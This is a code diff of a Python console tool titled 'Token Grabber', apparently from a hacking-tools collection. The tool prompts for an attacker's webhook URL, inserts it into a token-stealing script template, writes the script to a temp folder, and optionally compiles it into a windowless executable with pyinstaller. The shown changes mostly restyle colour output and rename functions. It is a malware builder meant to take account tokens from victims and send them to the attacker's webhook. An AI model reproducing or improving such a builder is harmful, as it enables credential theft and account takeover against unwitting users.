@@ -1,28 +1,29 @@
 from colorama import Fore
 import time, sys, os, ctypes, shutil
 
-def main():
-    ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber - Made by Astraa")
+def tokengrabber():
+    os.system(f'title Token Grabber - Made by Astraa')
 
     def spinner():
         l = ['|', '/', '-', '\\']
         for i in l+l:
-            sys.stdout.write(f"""\r{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Creating File... {i}""")
+            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Creating File... {i}""")
             sys.stdout.flush()
             time.sleep(0.2)
         print('\n')
         for i in l+l+l+l:
-            sys.stdout.write(f"""\r{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Writing File... {i}""")
+            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Writing File... {i}""")
             sys.stdout.flush()
             time.sleep(0.2)
 
-    tokengrabber()
-    print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter the name you want to give to the final file: """)
+    os.system('cls')
+    tokengrabbertitle()
+    print(f"""{y}[{w}+{y}]{w} Enter the name you want to give to the final file: """)
     global filename
-    fileName = str(input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } File name: """))
-    print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter your WebHook to generate a Token Grabber containing it: """)
+    fileName = str(input(f"""{y}[{b}#{y}]{w} File name: """))
+    print(f"""\n\n{y}[{w}+{y}]{w} Enter your WebHook to generate a Token Grabber containing it: """)
     global webhooklink
-    webhooklink = str(input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Webhook Link: """))
+    webhooklink = str(input(f"""{y}[{b}#{y}]{w} Webhook Link: """))
     print('\n')
     spinner()
 
@@ -193,32 +194,32 @@ def main():
 main()""".replace("~~TOKENURLHERE~~", webhooklink))
 
     except Exception as e:
-        print(f"""\n\n\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX }  Error writing file: {e}""")
+        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
         os.system(2)
         os.system('cls')
-        exit(0)
+        main()
 
-    print(f"""\n\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } File has been correctly written to "temp/{fileName}.py" """)
-    convert = input(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Convert your script into an executable (Y/N) ? """)
+    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "temp/{fileName}.py" """)
+    convert = input(f"""\n{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
     if convert == 'Y' or convert == 'y':
         time.sleep(1)
         os.system('cls')
-        print(f'{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } File creation...')
+        print(f'{y}[{b}#{y}]{w} File creation...')
         time.sleep(1)
         os.system(f"pyinstaller -y -F -w --distpath temp --specpath temp --workpath temp temp/{fileName}.py")
         os.system('cls')
-        print(f'{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Cleaning up old files...')
+        print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
         time.sleep(1)
         os.remove(f"temp/{fileName}.spec")
         shutil.rmtree(f"temp/{fileName}")
         shutil.rmtree(f"temp/__pycache__")
         time.sleep(1)
         os.system('cls')
-        tokengrabber()
-        print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } The executable file has been correctly generated""")
-        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to exit""")
+        tokengrabbertitle()
+        print(f"""{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated""")
+        input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
     else:
-        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to exit""")
-    exit(0)
+        input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
+    main()
 
-main()
+tokengrabber()
